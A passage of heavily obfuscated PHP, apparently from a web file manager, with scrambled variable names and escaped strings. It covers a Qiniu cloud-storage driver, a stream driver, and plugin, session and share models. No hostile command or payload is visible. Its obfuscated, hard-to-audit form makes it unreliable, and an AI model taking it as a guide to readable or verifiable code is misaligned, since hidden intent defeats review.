$‹´ç¸ßé = $‘¦ô’„ş[12]; $è¾ŒéÈí = 500; $Ûğ’í¿À = $‘¦ô’„ş[8]; $¹§´Šú = $Ò¯ì·« = 0; while (!0) { check_abort(); list($‹½“¶Ğ, $ƒ¬¸ä‹) = $this->bucketManager->listFiles($this->bucket, $¹››£§‡, $‹´ç¸ßé, $è¾ŒéÈí, $Ûğ’í¿À); if ($ƒ¬¸ä‹) { break; } $‹´ç¸ßé = array_key_exists($‘¦ô’„ş[1684], $‹½“¶Ğ) ? $‹´ç¸ßé = $‹½“¶Ğ[$‘¦ô’„ş[1738]] : $‘¦ô’„ş[12]; if ($¼Õ¾²ªã) { if (!empty($‹½“¶Ğ[$‘¦ô’„ş[1739]])) { $¹§´Šú += count($‹½“¶Ğ[$‘¦ô’„ş[1739]]); } if (!empty($‹½“¶Ğ[$‘¦ô’„ş[1740]])) { $Ò¯ì·« += count($‹½“¶Ğ[$‘¦ô’„ş[1740]]); } if ($‹´ç¸ßé === $‘¦ô’„ş[12]) { break; } continue; } if ($€œŒ§¾) { if (!empty($‹½“¶Ğ[$‘¦ô’„ş[1739]])) { return !0; } } else { if (!empty($‹½“¶Ğ[$‘¦ô’„ş[1740]])) { return !0; } } if ($‹´ç¸ßé === $‘¦ô’„ş[12]) { break; } } if ($¼Õ¾²ªã) { return array($‘¦ô’„ş[239] => $¹§´Šú, $‘¦ô’„ş[240] => $Ò¯ì·«); } return !1; } public function listAll($“ÅÃœ×“) { $ü’‰½å¼ =& $_SERVER[©—Ò»ÅĞ]; $¢ì¤Éú® = $this->fileList($“ÅÃœ×“, $ü’‰½å¼[12], !0); $ùâÕŠŞ = array_to_keyvalue($¢ì¤Éú®[$ü’‰½å¼[86]], $ü’‰½å¼[32]); foreach ($¢ì¤Éú®[$ü’‰½å¼[85]] as $œÕçÆú¬) { if (is_string($œÕçÆú¬)) { $ùâÕŠŞ[$œÕçÆú¬] = array($ü’‰½å¼[79] => 0); } } return $this->listAllFiles($“ÅÃœ×“, $ùâÕŠŞ); } private function fileList($àÔŸ™»®, $Ä»êæ§ = '', $ ­äÈ¤Æ = 0) { $—”ñë‡› =& $_SERVER[©—Ò»ÅĞ]; $àÔŸ™»® = trim($àÔŸ™»®, $—”ñë‡›[8]); $Š¢É¸É = empty($àÔŸ™»®) && $àÔŸ™»® !== $—”ñë‡›[228] ? $—”ñë‡›[12] : $àÔŸ™»® . $—”ñë‡›[8]; $³èàÛÏ… = $—”ñë‡›[12]; $Şú©‚ø¢ = 1000; $¢®…ˆï = $¤ãóÃàü = array(); while (!0) { check_abort(); list($Ú« ™÷â, $¶ ™¹ “) = $this->bucketManager->listFiles($this->bucket, $Š¢É¸É, $³èàÛÏ…, $Şú©‚ø¢, $Ä»êæ§); if ($¶ ™¹ “) { break; } $³èàÛÏ… = array_key_exists($—”ñë‡›[1684], $Ú« ™÷â) ? $³èàÛÏ… = $Ú« ™÷â[$—”ñë‡›[1738]] : $—”ñë‡›[12]; $ÌÒì¥Š» = isset($Ú« ™÷â[$—”ñë‡›[1739]]) ? $Ú« ™÷â[$—”ñë‡›[1739]] : array(); $Ã­áÍˆ´ = isset($Ú« ™÷â[$—”ñë‡›[1740]]) ? $Ú« ™÷â[$—”ñë‡›[1740]] : array(); foreach ($ÌÒì¥Š» as $¶ÑœóÓ) { if ($¶ÑœóÓ[$—”ñë‡›[95]] == $Š¢É¸É) { continue; } $¢İÚî˜¥ = $¶ÑœóÓ[$—”ñë‡›[95]]; $òŒãÉäì = $¶ÑœóÓ[$—”ñë‡›[1736]]; $¶ÑœóÓ[$—”ñë‡›[32]] = $¢İÚî˜¥; $¶ÑœóÓ[$—”ñë‡›[79]] = $òŒãÉäì; $ËîÕˆ‘§ = $òŒãÉäì == 0 && substr($¢İÚî˜¥, strlen($¢İÚî˜¥) - 1, 1) == $—”ñë‡›[8] ? !0 : !1; $this->cacheMethodInfoSet($¢İÚî˜¥, $ËîÕˆ‘§, $¶ÑœóÓ); if ($ËîÕˆ‘§) { $¢®…ˆï[] = $¢İÚî˜¥; continue; } $¤ãóÃàü[] = $ ­äÈ¤Æ ? $¶ÑœóÓ : $¢İÚî˜¥; } foreach ($Ã­áÍˆ´ as $¢İÚî˜¥) { if ($¢İÚî˜¥ == $Š¢É¸É) { continue; } $¢®…ˆï[] = $¢İÚî˜¥; $this->cacheMethodInfoSet($¢İÚî˜¥, !0); } if ($³èàÛÏ… === $—”ñë‡›[12]) { break; } } $this->cacheMethodInfoSet($àÔŸ™»®, !0); return array($—”ñë‡›[85] => $¢®…ˆï, $—”ñë‡›[86] => $¤ãóÃàü); } public function canRead($÷Ù–¶») { return $this->exist($÷Ù–¶») ? !0 : !1; } public function canWrite($Ò½©ü¼‹) { return $this->exist($Ò½©ü¼‹) ? !0 : !1; } public function getContent($ÅúÊÑş‘) { return $this->fileSubstr($ÅúÊÑş‘, 0, -1); } public function setContent($’¾®÷¢‰, $²¼šú¤ = '') { $¿»Ñ¸ƒŒ = $this->tempFile($this->pathThis($’¾®÷¢‰)); file_put_contents($¿»Ñ¸ƒŒ, $²¼šú¤); if ($this->upload($’¾®÷¢‰, $¿»Ñ¸ƒŒ)) { $this->tempFileRemve($¿»Ñ¸ƒŒ); return !0; } return !1; } public function refreshUrls($ÎœµõÒ) { $¦¶ŞÎñî =& $_SERVER[©—Ò»ÅĞ]; $¹çØ§’† = array(); if (is_array($ÎœµõÒ)) { foreach ($ÎœµõÒ as $Äö‹·›Õ) { $¹çØ§’†[] = $this->link($Äö‹·›Õ); } } else { $¹çØ§’†[] = $this->link($ÎœµõÒ); } $¯…Í± = new Qiniu\Cdn\CdnManager($this->auth); list($åêÁ‹Ïí, $¢ô€˜Ò…) = $¯…Í±->refreshUrls($¹çØ§’†); if ($¢ô€˜Ò…) { return !1; } return $åêÁ‹Ïí[$¦¶ŞÎñî[1371]] == $¦¶ŞÎñî[860] ? !0 : !1; } public function fileSubstr($Ñ¹Ÿµ, $üü×–±Æ, $µ‡«Î³ª) { $£åÈ÷ß¨ =& $_SERVER[©—Ò»ÅĞ]; if (!($‰¶¿ªÙ• = $this->link($Ñ¹Ÿµ))) { return !1; } $ÕçøÓµè = !1; if ($µ‡«Î³ª > 0) { $¯ö»Û² = $üü×–±Æ + $µ‡«Î³ª - 1; $ÕçøÓµè = array($£åÈ÷ß¨[1604] . $üü×–±Æ . $£åÈ÷ß¨[476] . $¯ö»Û²); } $·æÕî¸¹ = url_request($‰¶¿ªÙ•, $£åÈ÷ß¨[1605], !1, $ÕçøÓµè); return $·æÕî¸¹[$£åÈ÷ß¨[850]] ? $·æÕî¸¹[$£åÈ÷ß¨[1392]] : !1; } public function upload($Ş¯Õ Íç, $‘¨¬ï×û, $çˆî¢Éç = false, $³•äË“Á = REPEAT_REPLACE) { if (!$‘¨¬ï×û || !@file_exists($‘¨¬ï×û)) { return !1; } $—Èã®Œ = new Qiniu\Storage\UploadManager(); $Ì±¯¥­ = $this->auth->uploadToken($this->bucket, $Ş¯Õ Íç); $Ôà£Ğ¦› = get_file_mime(get_path_ext($‘¨¬ï×û)); list($ÁñŞŸ”‘, $Åì ’«) = $—Èã®Œ->putFile($Ì±¯¥­, $Ş¯Õ Íç, $‘¨¬ï×û, null, $Ôà£Ğ¦›); return $Åì ’« ? !1 : $this->getPathOuter($Ş¯Õ Íç); } public function uploadFormData($‚•×¦Ô, $õßİıñ‘ = 3600) { return $this->uploadToken($‚•×¦Ô, $õßİıñ‘); } public function uploadMultiData($ú¬´ã—ı, $ÃËÑºÉ‡ = 3600) { return $this->uploadToken($ú¬´ã—ı, $ÃËÑºÉ‡); } private function uploadToken($õØ„·­³, $ª—ÍË‹Ü = 3600) { $„öŠÚ”‹ =& $_SERVER[©—Ò»ÅĞ]; $§çò¥¼œ = $ª—ÍË‹Ü; $Î‚ƒ©Å» = array($„öŠÚ”‹[1741] => $„öŠÚ”‹[1742]); $ÄŒË¡Ùí = $õØ„·­³; $¹ÊÍïˆ¢ = $this->auth->uploadToken($this->bucket, $ÄŒË¡Ùí, $§çò¥¼œ, $Î‚ƒ©Å», !0); $Ÿ×šÕÈ = empty($this->region) || $this->region == $„öŠÚ”‹[1743] ? $„öŠÚ”‹[12] : $„öŠÚ”‹[476] . $this->region; $„“æ—˜Ö = http_type() . "\x3a\57\57\x75\x70\154\157\x61\144{$Ÿ×šÕÈ}\56\x71\x69\156\151\x75\160\56\x63\157\155\57"; return array($„öŠÚ”‹[1744] => $¹ÊÍïˆ¢, $„öŠÚ”‹[1607] => $„“æ—˜Ö); } public function download($Çïù¶Ë, $Ÿîš‰É¡) { $÷©‚ôù = IO::getPathInner(IO::mkfile($Ÿîš‰É¡)); if (!($ØÚèÀÑ¤ = $this->link($Çïù¶Ë))) { return !1; } $šî‹¤äâ = 0; $’“­¯ù² = 1024 * 200; $Ò‚ÈÊÚ = fopen($÷©‚ôù, $_SERVER[©—Ò»ÅĞ][1745]); while (!0) { $Ş¶Æ‚ò¾ = $this->fileSubstr($Çïù¶Ë, $šî‹¤äâ, $’“­¯ù²); if ($Ş¶Æ‚ò¾ === !1) { return !1; } fwrite($Ò‚ÈÊÚ, $Ş¶Æ‚ò¾); $šî‹¤äâ += $’“­¯ù²; if (strlen($Ş¶Æ‚ò¾) < $’“­¯ù²) { break; } } fclose($Ò‚ÈÊÚ); return $Ÿîš‰É¡; } public function link($¹ÅùèŒ­, $Û²¼î© = '') { if (!$this->isFile($¹ÅùèŒ­)) { return !1; } $²¢ÈÚÙü = $this->getHost() . $_SERVER[©—Ò»ÅĞ][8] . $this->pathEncode($¹ÅùèŒ­) . $Û²¼î©; return $this->auth->privateDownloadUrl($²¢ÈÚÙü, 3600 * 12); } public function fileOut($Çè³”´š, $Š½òèû… = false, $°ºïº¡· = false, $˜ÚŠƒ¢„ = '') { $Šä¯¸× =& $_SERVER[©—Ò»ÅĞ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Çè³”´š, $Š½òèû…, $°ºïº¡·, $˜ÚŠƒ¢„); } if (!$°ºïº¡·) { $°ºïº¡· = $this->pathThis($Çè³”´š); } $—ı•ÇÁÉ = $Š½òèû… ? $Šä¯¸×[1746] . rawurlencode($°ºïº¡·) : $Šä¯¸×[12]; $ĞÀ—€° = $this->link($Çè³”´š, $—ı•ÇÁÉ); $this->fileOutLink($ĞÀ—€°); } public function fileOutServer($‘§‡úÉ, $ö¢£Ô” = false, $ÛöæûĞ‡ = false, $„Ï†³ˆ = '') { parent::fileOut($‘§‡úÉ, $ö¢£Ô”, $ÛöæûĞ‡, $„Ï†³ˆ); } public function fileOutImage($¾–éÕäí, $Ú˜Şå´ = 250) { if ($this->size($¾–éÕäí) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¾–éÕäí, $Ú˜Şå´); } $ùÄŸ„¢¹ = $this->link($¾–éÕäí, $_SERVER[©—Ò»ÅĞ][1747] . $Ú˜Şå´); $this->fileOutLink($ùÄŸ„¢¹); } public function fileOutImageServer($¿³‡µé›, $Õ¤šé€Á = 250) { parent::fileOutImage($¿³‡µé›, $Õ¤šé€Á); } public function hashMd5($ò¸ÊªÅÛ) { $ ÁïŸ› =& $_SERVER[©—Ò»ÅĞ]; $×ù‡˜Á» = $this->objectMeta($ò¸ÊªÅÛ); return isset($×ù‡˜Á»[$ ÁïŸ›[245]]) ? $×ù‡˜Á»[$ ÁïŸ›[245]] : !1; $÷Òã³Üî = $this->link($ò¸ÊªÅÛ, $ ÁïŸ›[1748]); } public function size($ï‰°ôù¢) { $éÛÆˆ¡‹ = $this->objectMeta($ï‰°ôù¢); return $éÛÆˆ¡‹ ? $éÛÆˆ¡‹[$_SERVER[©—Ò»ÅĞ][79]] : 0; } public function info($‡¡„š™ù) { if ($this->isFolder($‡¡„š™ù)) { return $this->folderInfo($‡¡„š™ù); } else { if ($this->isFile($‡¡„š™ù)) { return $this->fileInfo($‡¡„š™ù); } } return !1; } public function exist($·ÁâÛË¿) { return $this->isFile($·ÁâÛË¿) || $this->isFolder($·ÁâÛË¿); } public function isFile($­—ôÎ‘š) { return !$this->isFolder($­—ôÎ‘š) && $this->objectMeta($­—ôÎ‘š); } public function isFolder($ÑÃô„ò—) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][177], $ÑÃô„ò—); } protected function objectMeta($«í¨ùÚ„) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][179], $«í¨ùÚ„); } protected function _objectMeta($ÙäˆÊ») { $ÄÛ¨éÅÇ =& $_SERVER[©—Ò»ÅĞ]; list($Ó¥ãÔÜÉ, $£¤¨¸·Ö) = $this->bucketManager->stat($this->bucket, $ÙäˆÊ»); if ($Ó¥ãÔÜÉ) { $Ó¥ãÔÜÉ[$ÄÛ¨éÅÇ[79]] = intval($Ó¥ãÔÜÉ[$ÄÛ¨éÅÇ[1736]]); } return $Ó¥ãÔÜÉ; } protected function _isFolder($îÍ® ş¥) { $Ÿô¥ç¦Ó =& $_SERVER[©—Ò»ÅĞ]; if ($îÍ® ş¥ == $Ÿô¥ç¦Ó[12] || $îÍ® ş¥ == $Ÿô¥ç¦Ó[8]) { return !0; } list($™ô¡«™, $Õ…òÃ˜×) = $this->bucketManager->listFiles($this->bucket, trim($îÍ® ş¥, $Ÿô¥ç¦Ó[8]) . $Ÿô¥ç¦Ó[8], $Ÿô¥ç¦Ó[12], 1, $Ÿô¥ç¦Ó[8]); return !empty($™ô¡«™[$Ÿô¥ç¦Ó[1739]]) || !empty($™ô¡«™[$Ÿô¥ç¦Ó[1740]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÁÁ®ÁÁÚ, $ÄÆ ·Ñ² = 0) { parent::__construct(); $this->source = $ÁÁ®ÁÁÚ; $this->sourceSize = $ÄÆ ·Ñ²; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($³õçñè = false) { return $this->sourceSize; } public function getContent($­à½Ô×Ó = false) { return $this->fileSubstr($­à½Ô×Ó, 0, $this->sourceSize); } public function fileSubstr($åóŠ¼İ¨ = false, $ËîåË·è = 0, $Îı¼ÂœÀ = 0) { if (!$Îı¼ÂœÀ) { $Îı¼ÂœÀ = $this->sourceSize; } $Ğ¢ŒÆ = $this->sourceSize - $ËîåË·è; if ($Îı¼ÂœÀ >= $Ğ¢ŒÆ) { $Îı¼ÂœÀ = $Ğ¢ŒÆ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ËîåË·è, $Îı¼ÂœÀ); } if ($this->sourceType == self::TYPE_FILE) { if ($Îı¼ÂœÀ <= 0) { return $_SERVER[©—Ò»ÅĞ][12]; } $¸«·œù± = ftell($this->source); fseek_64($this->source, $¸«·œù± + $ËîåË·è); $Á‘šçŒ = @fread($this->source, $Îı¼ÂœÀ); fseek_64($this->source, $¸«·œù±); return $Á‘šçŒ; } } public function hashMd5($°ì…ç€˜ = false) { return md5($this->getContent()); } public static function hash($Ÿ©ëŒ°, $¢¥’Ø£ = 0) { $¨Ã±º = new PathDriverStream($Ÿ©ëŒ°, $¢¥’Ø£); return $¨Ã±º->hashSimple($Ÿ©ëŒ°); } public static function md5($‰€ÈÖš, $Œğº´†‰ = 0) { $¯çª·Öê = new PathDriverStream($‰€ÈÖš, $Œğº´†‰); return $¯çª·Öê->hashMd5($‰€ÈÖš); } } goto Bé§ãÏ†¡„; BÑ¬ó©ª: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x70\x6c\165\147\x69\x6e\114\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x73\x74\141\x74\x75\163", "\x72\x65\147\x69\145\x73\x74", "\x63\x6f\156\x66\x69\147"); public function loadList($Ş°ÙåÀÓ = false) { $é¢å¡İƒ = array_to_keyvalue($this->listData(), $_SERVER[©—Ò»ÅĞ][32]); if ($Ş°ÙåÀÓ) { return $é¢å¡İƒ[$Ş°ÙåÀÓ]; } return $é¢å¡İƒ; } public function init() { $£¾“õÅî =& $_SERVER[©—Ò»ÅĞ]; Hook::trigger($£¾“õÅî[2305]); $ôáŞƒÑ¦ = $this->loadPluginList(); foreach ($ôáŞƒÑ¦ as $ÕÒ½ºØ› => $ÇÏÆÓ„) { $Õıß”¶¥ = $this->appAllow($ÕÒ½ºØ›, $ÇÏÆÓ„); if (!$Õıß”¶¥) { continue; } foreach ($ÇÏÆÓ„[$£¾“õÅî[2306]] as $º±ßäÀ => $óº÷ó±è) { Hook::bind($º±ßäÀ, $óº÷ó±è); } } Hook::trigger($£¾“õÅî[2307]); Hook::trigger(ACTION); } public function appAllow($„›”§¾°, $Ûœ»Øü, $†ƒ¢Šò¾ = true) { $Ğîä¬·Ú =& $_SERVER[©—Ò»ÅĞ]; $åè¿ÜÈ† = PLUGIN_DIR . $„›”§¾° . $Ğîä¬·Ú[2308]; if (!is_array($Ûœ»Øü) || !is_array($Ûœ»Øü[$Ğîä¬·Ú[2306]]) || $Ûœ»Øü[$Ğîä¬·Ú[850]] != 1 || !is_file($åè¿ÜÈ†)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ğîä¬·Ú[6]][$Ğîä¬·Ú[2309]] || !$GLOBALS[$Ğîä¬·Ú[6]][$Ğîä¬·Ú[2310]]) { return !0; } $üÃØäâ… = explode($Ğîä¬·Ú[50], strtolower($GLOBALS[$Ğîä¬·Ú[6]][$Ğîä¬·Ú[2310]])); return in_array(strtolower($„›”§¾°), $üÃØäâ…) ? !1 : !0; } if ($†ƒ¢Šò¾ && !Action($Ğîä¬·Ú[2311])->checkAuth($„›”§¾°)) { return !1; } return !0; } public function unInstall($ª†Æğş) { $Ò·Ñ®Š« =& $_SERVER[©—Ò»ÅĞ]; $ª—ª–ÌŸ = $this->loadList($ª†Æğş); if (file_exists(PLUGIN_DIR . $ª†Æğş)) { Hook::apply($ª†Æğş . $Ò·Ñ®Š«[2312]); } $this->remove($ª—ª–ÌŸ[$Ò·Ñ®Š«[487]]); } public function changeStatus($ù°—Ú±—, $ŠÈõ®æÌ) { $ùÉ†°¿ƒ =& $_SERVER[©—Ò»ÅĞ]; $´Üóºˆµ = $this->loadList($ù°—Ú±—); if ($ŠÈõ®æÌ) { Hook::apply($ù°—Ú±— . $ùÉ†°¿ƒ[2313]); } $this->update($´Üóºˆµ[$ùÉ†°¿ƒ[487]], array($ùÉ†°¿ƒ[2314] => $ŠÈõ®æÌ)); } public function appRegist($şîğ›œ, $ŸÖ Æ±ï) { $™ÀÜ­Ö =& $_SERVER[©—Ò»ÅĞ]; $Ë¸ö†Å = $this->loadList($şîğ›œ); if ($Ë¸ö†Å) { $this->update($Ë¸ö†Å[$™ÀÜ­Ö[487]], array($™ÀÜ­Ö[2306] => $ŸÖ Æ±ï)); } else { $· ™ËË = array($™ÀÜ­Ö[32] => $şîğ›œ, $™ÀÜ­Ö[2306] => $ŸÖ Æ±ï, $™ÀÜ­Ö[850] => 0, $™ÀÜ­Ö[6] => $this->getConfigDefault($şîğ›œ)); $this->insert($· ™ËË); } } public function getConfigDefault($Îõ­Ç‘‰) { $·²Ñâš‚ =& $_SERVER[©—Ò»ÅĞ]; $´•ŒÊ¹ = array(); $¹Ç´Ù»Ã = $this->getPackageJson($Îõ­Ç‘‰); if (!$¹Ç´Ù»Ã && is_array($¹Ç´Ù»Ã[$·²Ñâš‚[2315]])) { return $´•ŒÊ¹; } foreach ($¹Ç´Ù»Ã[$·²Ñâš‚[2315]] as $ë£ü¬È => $ ïÌıï©) { if (!isset($ ïÌıï©[$·²Ñâš‚[451]]) || isset($´•ŒÊ¹[$ë£ü¬È])) { continue; } $´•ŒÊ¹[$ë£ü¬È] = $ ïÌıï©[$·²Ñâš‚[451]]; } return $´•ŒÊ¹; } public function getPackageJson($ğ×™µû) { return Hook::apply($ğ×™µû . $_SERVER[©—Ò»ÅĞ][2316]); } public function getConfig($Í‰·…ÛÎ, $„—ˆ—Ä¤ = false) { $“öÙ¸È” =& $_SERVER[©—Ò»ÅĞ]; $×ÏúÌß = array(); $§øëşû = $this->loadList($Í‰·…ÛÎ); if ($§øëşû && is_array($§øëşû[$“öÙ¸È”[6]])) { $×ÏúÌß = $§øëşû[$“öÙ¸È”[6]]; } if (!$×ÏúÌß || $„—ˆ—Ä¤) { $×ÏúÌß = $this->getConfigDefault($Í‰·…ÛÎ); } return $×ÏúÌß; } public function setConfig($—Ë´çŒ¥, $†ìö± = false) { $õû¶ıì‹ =& $_SERVER[©—Ò»ÅĞ]; $Ù¿¸åÁÅ = $this->loadList($—Ë´çŒ¥); if (!$Ù¿¸åÁÅ) { return !1; } $ŒŒµ´â© = $Ù¿¸åÁÅ[$õû¶ıì‹[6]]; if ($†ìö± == !1) { $ŒŒµ´â© = array(); $†ìö± = $this->getConfigDefault($—Ë´çŒ¥); } foreach ($†ìö± as $ĞÒÂ—¤¢ => $¾†’ğûé) { $ŒŒµ´â©[$ĞÒÂ—¤¢] = is_string($¾†’ğûé) ? trim($¾†’ğûé) : $¾†’ğûé; } $this->update($Ù¿¸åÁÅ[$õû¶ıì‹[487]], array($õû¶ıì‹[6] => $ŒŒµ´â©)); } public function viewList() { $äÍşÆ÷— =& $_SERVER[©—Ò»ÅĞ]; $Óé‚ƒâ = $this->loadList(); $this->pluginScan($Óé‚ƒâ); $Óé‚ƒâ = $this->loadPluginList(); $®–ÖäÄ = array(); foreach ($Óé‚ƒâ as $ëâ·è½ª => $Å§ó¨ô¤) { $Ò©”›® = $Å§ó¨ô¤; unset($Å§ó¨ô¤[$äÍşÆ÷—[2306]], $Å§ó¨ô¤[$äÍşÆ÷—[6]]); $ó›Õâü = PLUGIN_DIR . $Å§ó¨ô¤[$äÍşÆ÷—[32]] . $äÍşÆ÷—[2308]; if (!is_file($ó›Õâü)) { continue; } $µ¾á©Ú— = Hook::apply($Å§ó¨ô¤[$äÍşÆ÷—[32]] . $äÍşÆ÷—[2316]); if (!is_array($µ¾á©Ú—)) { continue; } $®–ÖäÄ[$ëâ·è½ª] = array_merge($Å§ó¨ô¤, $µ¾á©Ú—); if ($Ò©”›®[$äÍşÆ÷—[6]][$äÍşÆ÷—[1890]] != $µ¾á©Ú—[$äÍşÆ÷—[1864]]) { Hook::apply($Å§ó¨ô¤[$äÍşÆ÷—[32]] . $äÍşÆ÷—[2313]); $Ò©”›®[$äÍşÆ÷—[6]][$äÍşÆ÷—[1890]] = $µ¾á©Ú—[$äÍşÆ÷—[1864]]; $this->update($Å§ó¨ô¤[$äÍşÆ÷—[487]], array($äÍşÆ÷—[6] => $Ò©”›®[$äÍşÆ÷—[6]])); } } return $®–ÖäÄ; } private function loadPluginList() { $øÄ•°± =& $_SERVER[©—Ò»ÅĞ]; $†ƒ¥ÅÃ = $this->loadList(); if (strtolower(MOD) == $øÄ•°±[2317]) { return $†ƒ¥ÅÃ; } $Ğ•ÍŞÖ¿ = Hook::trigger($øÄ•°±[2318], $†ƒ¥ÅÃ); if ($†ƒ¥ÅÃ && !$Ğ•ÍŞÖ¿) { die; } return $Ğ•ÍŞÖ¿ ? $Ğ•ÍŞÖ¿ : $†ƒ¥ÅÃ; } private function pluginScan($ÚÏ¬¤Œ˜) { $ÎëòµŸÇ =& $_SERVER[©—Ò»ÅĞ]; recursion_dir(PLUGIN_DIR, $•Ê†óşˆ, $Ç¢ ‹œ½, 0); foreach ($•Ê†óşˆ as $ù»ö‰½‹) { $šäó•Ù = get_path_this($ù»ö‰½‹); if (isset($ÚÏ¬¤Œ˜[$šäó•Ù]) || !file_exists($ù»ö‰½‹ . $ÎëòµŸÇ[2319]) || !file_exists($ù»ö‰½‹ . $ÎëòµŸÇ[2308])) { continue; } Hook::apply($šäó•Ù . $ÎëòµŸÇ[2313]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\x5f\x73\145\163\x73\x69\x6f\156"; public function get($‚Ñ¼¸³) { $Æ–»ğ° =& $_SERVER[©—Ò»ÅĞ]; $ì–’«— = $this->where(array($Æ–»ğ°[2320] => $‚Ñ¼¸³))->find(); if (!is_array($ì–’«—)) { return !1; } return $ì–’«—[$Æ–»ğ°[168]]; } public function set($ªéáÂÆò, $íï¿³‚ˆ, $îúù¹Õ = 3600) { $¶“¹‰ç… =& $_SERVER[©—Ò»ÅĞ]; $íÃ¨ùœÁ = array($¶“¹‰ç…[2320] => $ªéáÂÆò, $¶“¹‰ç…[2223] => $íï¿³‚ˆ, $¶“¹‰ç…[2321] => $îúù¹Õ + time()); if (Session::get($¶“¹‰ç…[2322])) { $íÃ¨ùœÁ[$¶“¹‰ç…[1592]] = Session::get($¶“¹‰ç…[2322]); } else { $íÃ¨ùœÁ[$¶“¹‰ç…[1592]] = 0; } if ($this->get($ªéáÂÆò)) { return $this->where(array($¶“¹‰ç…[2320] => $ªéáÂÆò))->save($íÃ¨ùœÁ); } else { return $this->add($íÃ¨ùœÁ, array(), !0); } } public function remove($æÇÚ¼ò€) { return $this->where(array($_SERVER[©—Ò»ÅĞ][2320] => $æÇÚ¼ò€))->delete(); } public function clearTimeout() { return $this->where($_SERVER[©—Ò»ÅĞ][2323] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\124\151\x6d\x65", "\164\151\x6d\145", "\151\156\x73\x65\162\164\x2c\x75\x70\144\x61\x74\145", "\146\165\x6e\x63\x74\151\157\x6e"), array("\x63\x72\145\x61\164\x65\x54\151\155\x65", "\x74\x69\x6d\x65", "\151\156\163\145\162\164", "\x66\165\156\x63\x74\151\157\x6e"), array("\157\x70\164\151\157\x6e\x73", '', "\x69\156\x73\145\x72\x74\54\x75\160\144\141\164\145\x2c\x73\x65\154\145\143\x74", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($îåÑ™Üç) { $š­“²ˆÜ =& $_SERVER[©—Ò»ÅĞ]; return array($š­“²ˆÜ[2324] => array(USER_ID, $š­“²ˆÜ[2325]), $š­“²ˆÜ[2326] => array($îåÑ™Üç[0], $š­“²ˆÜ[2327])); } protected function ___listSimple() { $ğ¥˜ÚÉë = $this->field($this->fieldList)->where(array($_SERVER[©—Ò»ÅĞ][1592] => USER_ID))->select(); return $ğ¥˜ÚÉë ? $ğ¥˜ÚÉë : array(); } protected function ___getInfoShare($Ñ¶›åì) { return $this->_getShareInfo(array($_SERVER[©—Ò»ÅĞ][687] => $Ñ¶›åì), !1); } protected function getInfo($Á€óÓÆ) { $Û°á°ÛÊ = $this->getInfoShare($Á€óÓÆ); return $this->shareSourceInfo($Û°á°ÛÊ); } public function getInfoByHash($ú‚—Áû) { return $this->_getShareInfo(array($_SERVER[©—Ò»ÅĞ][1554] => $ú‚—Áû)); } public function getInfoByPath($³©ä„ü) { $˜…çò”ç =& $_SERVER[©—Ò»ÅĞ]; $¡º¿õ = array($˜…çò”ç[1592] => USER_ID, $˜…çò”ç[191] => $³©ä„ü); return $this->_getShareInfo($¡º¿õ); } public function getInfoBySourcePath($úÅÕ—») { $Ü²¸Ãø‹ =& $_SERVER[©—Ò»ÅĞ]; $¿ó¼Ö‚Ì = array($Ü²¸Ãø‹[1592] => USER_ID, $Ü²¸Ãø‹[583] => $úÅÕ—»); return $this->_getShareInfo($¿ó¼Ö‚Ì); } private function _getShareInfo($”¼º¾·, $Ï‚ŞÈÖº = true) { $æÆÕËê =& $_SERVER[©—Ò»ÅĞ]; $ü„’°¯„ = $this->where($”¼º¾·)->find(); if (!$ü„’°¯„) { return !1; } if (!is_array($ü„’°¯„[$æÆÕËê[580]])) { $ü„’°¯„[$æÆÕËê[580]] = array(); } $”¼º¾· = array($æÆÕËê[687] => $ü„’°¯„[$æÆÕËê[687]]); $œö¥—¥– = $æÆÕËê[2328]; $ü„’°¯„[$æÆÕËê[1550]] = Model($æÆÕËê[688])->order($æÆÕËê[487])->field($œö¥—¥–)->where($”¼º¾·)->select(); if (!$Ï‚ŞÈÖº) { return $ü„’°¯„; } return $this->shareSourceInfo($ü„’°¯„); } private function shareSourceInfo($‡ş½ğÈ) { $Ğ“êò¿ =& $_SERVER[©—Ò»ÅĞ]; if (!is_array($‡ş½ğÈ)) { return $‡ş½ğÈ; } if ($‡ş½ğÈ[$Ğ“êò¿[191]] == $Ğ“êò¿[228]) { $‡ş½ğÈ[$Ğ“êò¿[90]] = IO::info($‡ş½ğÈ[$Ğ“êò¿[583]]); } else { $‡ş½ğÈ[$Ğ“êò¿[90]] = Model($Ğ“êò¿[1533])->pathInfo($‡ş½ğÈ[$Ğ“êò¿[191]]); } return $‡ş½ğÈ; } protected function getInfoAuth($ëóøñå¥) { $ºûÍ¤µø =& $_SERVER[©—Ò»ÅĞ]; $ã——øÁ = $this->getInfo($ëóøñå¥); if ($ã——øÁ[$ºûÍ¤µø[1592]] == USER_ID) { $ã——øÁ[$ºûÍ¤µø[502]] = $ã——øÁ[$ºûÍ¤µø[90]][$ºûÍ¤µø[502]]; } else { $ã——øÁ[$ºûÍ¤µø[502]] = Model($ºûÍ¤µø[587])->authMake($ã——øÁ[$ºûÍ¤µø[1550]]); } return $ã——øÁ; } protected function listData($£ú£¹‰² = null, $ÌÀåßÙğ = 300) { $öÅ¼Ù¾³ =& $_SERVER[©—Ò»ÅĞ]; $¿×—ò£æ = array(array($öÅ¼Ù¾³[578] => array($öÅ¼Ù¾³[1180], 0), $öÅ¼Ù¾³[685] => array($öÅ¼Ù¾³[1180], 0), $öÅ¼Ù¾³[2329] => $öÅ¼Ù¾³[2285])); if ($£ú£¹‰² == $öÅ¼Ù¾³[2330]) { $¿×—ò£æ = array($öÅ¼Ù¾³[578] => 1); } else 